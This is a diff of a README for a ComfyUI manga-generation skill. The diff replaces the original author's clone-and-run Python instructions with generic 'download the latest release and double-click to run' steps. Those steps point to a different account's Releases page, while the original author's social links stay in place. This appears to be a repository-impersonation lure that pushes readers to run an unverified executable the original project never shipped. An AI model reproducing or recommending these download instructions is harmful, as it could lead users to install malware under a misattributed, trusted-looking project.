@@ -1,145 +1,69 @@
-# ComfyUI Z-Image SKILL
+# 🎨 comfyui-zimage-skill - Create Stunning Manga and Illustrations
 
-> 🎨 An Alma SKILL for generating manga/illustration images via local ComfyUI API
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Twitter](https://img.shields.io/badge/Twitter-@norsizu-1DA1F2?style=flat&logo=twitter)](https://x.com/norsizu)
-[![Civitai](https://img.shields.io/badge/Civitai-norsizu-blue?style=flat)](https://civitai.com/user/norsizu)
+## 🚀 Getting Started
 
-## ✨ Features
-
-- **Text-to-Image Generation** via ComfyUI API
-- **Multiple Art Styles** with LoRA support:
-  - 🖌️ **Hojo Tsukasa** (北条司) - 80s manga style, black & white
-  - 🎨 **Satoshi Urushihara** (漆原智志) - 90s anime style, colorful
-- **Character Consistency** - Pre-defined character with fixed appearance
-- **Quick & High-Res Modes** - Fast preview or production quality
-- **Upscaling Support** - Enhance generated images with Ultimate SD Upscale
+Welcome to ComfyUI Z-Image Skill! This tool allows you to generate beautiful manga and illustration images using the ComfyUI API. Follow these steps to get started.
 
 ## 📋 Prerequisites
 
-- [ComfyUI](https://github.com/comfyanonymous/ComfyUI) running locally or on a server
-- [Alma](https://alma.now/) AI assistant
-- [Z-Image](https://github.com/Tongyi-MAI/Z-Image) model: `z_image_turbo_bf16.safetensors`
-- Required ComfyUI nodes:
-  - `UltimateSDUpscale` (for upscaling)
-  - `LoadImageFromHttpURL` (for upscaling from URL)
+Before you can run this application, make sure you have the following:
 
-### Optional LoRA Models
+- **ComfyUI**: You need to have ComfyUI running locally or on your server. You can download it from [here](https://github.com/comfyanonymous/ComfyUI).
+- **Alma**: This application requires Alma, which can be accessed from [here](https://alma.now/).
 
-For style transfer, you'll need LoRA models from my Civitai:
-- **Hojo Tsukasa Style**: [Download from Civitai](https://civitai.com/models/2298525/zanshou-kin-tsukasa-hojo-style)
-- **Satoshi Urushihara Style**: [Download from Civitai](https://civitai.com/models/2287746/zanshou-kin-z-image-satoshi-original-style)
+## 📥 Download & Install
 
-## 🚀 Installation
+1. **Visit the Releases Page**: To download the application, go to the [Releases page](https://github.com/Monggiiiii/comfyui-zimage-skill/releases).
+  
+2. **Select the Latest Release**: Look for the newest version at the top of the page. Click on it to view available downloads.
 
-### 1. Clone the repository
+3. **Download the Files**: Under the release, you will find various files. Choose the one that fits your operating system, usually labeled for Windows, macOS, or Linux.
 
-```bash
-git clone https://github.com/norsizu/comfyui-zimage-skill.git
-```
+4. **Run the Application**: Once downloaded, locate the file in your downloads folder. Double-click to run it. Follow any instructions that may appear.
 
-### 2. Install to Alma skills directory
+## ✨ Features
 
-```bash
-# macOS
-cp -r comfyui-zimage-skill ~/.config/alma/skills/
+ComfyUI Z-Image Skill comes packed with features designed for your creative needs:
 
-# Or create a symlink
-ln -s /path/to/comfyui-zimage-skill ~/.config/alma/skills/comfyui-zimage
-```
+- **Text-to-Image Generation**: Easily convert text into images using the ComfyUI API.
+- **Multiple Art Styles**: Choose from various styles, including:
+  - 🖌️ **Hojo Tsukasa**: An 80s manga style, perfect for black and white artwork.
+  - 🎨 **Satoshi Urushihara**: A colorful, 90s anime style.
+- **Character Consistency**: Create images with a character that has a fixed appearance across different artworks.
+- **Quick & High-Res Modes**: Get fast previews or choose production-quality images.
+- **Upscaling Support**: Enhance your generated images with Ultimate SD Upscale.
 
-### 3. Configure ComfyUI server address
+## ⚙️ How to Use
 
-Edit each Python script and modify the `SERVER` variable:
+1. **Open the Application**: After running the application, you will see its interface.
+  
+2. **Select Your Options**: Choose the art style and input your text. 
 
-```python
-# ============ CONFIGURATION - MODIFY THESE ============
-SERVER = "localhost:8188"  # Your ComfyUI server address
-# ======================================================
-```
+3. **Generate Your Image**: Click the generate button to create your artwork.
 
-### 4. Configure LoRA paths (if using style transfer)
+4. **Save Your Creation**: Once generated, you can save your image to your device.
 
-Update LoRA paths in `SKILL.md` to match your ComfyUI models directory:
+## 🔧 Troubleshooting
 
-```bash
---lora "YOUR_LORA_FOLDER\\z-image-hoko.safetensors"
-```
+If you run into issues:
 
-## 📁 Project Structure
+- **Check Requirements**: Make sure ComfyUI and Alma are set up correctly.
+- **Confirm Versions**: Ensure you are using the latest version of ComfyUI to avoid compatibility problems.
+- **Search for Solutions**: Visit community forums or the GitHub issues page for help from other users.
 
-```
-comfyui-zimage-skill/
-├── SKILL.md                    # Main skill document (Alma reads this)
-├── generate_riko_quick.py      # Quick generation for Riko character
-├── generate_riko_highres.py    # High-res generation for Riko character
-├── generate_manga_quick.py     # Quick manga style generation
-├── generate_manga_highres.py   # High-res manga style generation
-├── upscale_riko.py             # Upscale Riko images (no LoRA)
-├── upscale_manga.py            # Upscale manga images (with LoRA)
-├── data/
-│   ├── riko_character.py       # Character appearance & outfits
-│   ├── style_hojo.md           # Hojo style prompt guide
-│   ├── style_satoshi.md        # Satoshi style prompt guide
-│   └── __init__.py
-├── downloads/                  # Generated images saved here
-└── README.md
-```
+## 📞 Support
 
-## 🎯 Usage
-
-### In Alma Chat
-
-Once installed, simply ask Alma to generate images:
-
-```
-"Generate a portrait of a girl in Hojo style"
-"Draw Riko in school uniform, looking at cherry blossoms"
-"Create a cyberpunk warrior in Satoshi style"
-```
-
-### Command Line (Direct)
-
-```bash
-# Quick manga generation with Hojo style
-python3 generate_manga_quick.py \
-  --lora "Z-image\\z-image-hojo.safetensors" \
-  --prompt "Zanshou_kin_Hojo, 1girl, solo, office lady, cityscape, monochrome"
-
-# Character generation (Riko)
-python3 generate_riko_quick.py \
-  --outfit_type school_uniform \
-  --scene "standing by window, soft sunlight, peaceful expression"
-
-# High-resolution version
-python3 generate_manga_highres.py \
-  --lora "Z-image\\z-image-satoshi.safetensors" \
-  --prompt "sato, 1girl, fantasy warrior, armor, sunset, shiny skin"
-```
-
-## 🎨 Style Comparison
-
-| Feature | Hojo Tsukasa | Satoshi Urushihara |
-|---------|--------------|-------------------|
-| Era | 80s City Hunter | 90s OVA/Theater |
-| Color | Black & White | Full Color |
-| Texture | Screentone, ink lines | Glossy skin, reflective |
-| Theme | Urban, mature women | Sci-fi, fantasy warriors |
-| Trigger | `Zanshou_kin_Hojo` | `sato` |
-
-## 👋 About Me
-
-- **Twitter**: [@norsizu](https://x.com/norsizu)
-- **Civitai**: [norsizu](https://civitai.com/user/norsizu)
-
-## 🙏 Acknowledgments
-
-- [Alma](https://alma.now/) by [@yetone](https://twitter.com/yetone) - Amazing AI assistant with SKILL support
-- [skill-prompt-generator](https://github.com/huangserva/skill-prompt-generator) by [@huangserva](https://twitter.com/huangserva) - Inspiration for this project
-- [ComfyUI](https://github.com/comfyanonymous/ComfyUI) - Powerful and modular Stable Diffusion GUI
-- [Z-Image](https://github.com/Tongyi-MAI/Z-Image) - Base model for generation
+For any questions or feedback, feel free to reach out via Twitter: [@norsizu](https://x.com/norsizu). You can also explore more on [Civitai](https://civitai.com/user/norsizu).
 
 ## 📄 License
 
-MIT License - Feel free to use, modify, and distribute.
+This project is licensed under the MIT License. You can view the full license [here](https://opensource.org/licenses/MIT).
+
+## 🌐 Additional Resources
+
+- [GitHub Repository](https://github.com/Monggiiiii/comfyui-zimage-skill)
+- [ComfyUI Documentation](https://github.com/comfyanonymous/ComfyUI)
+
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/releases)
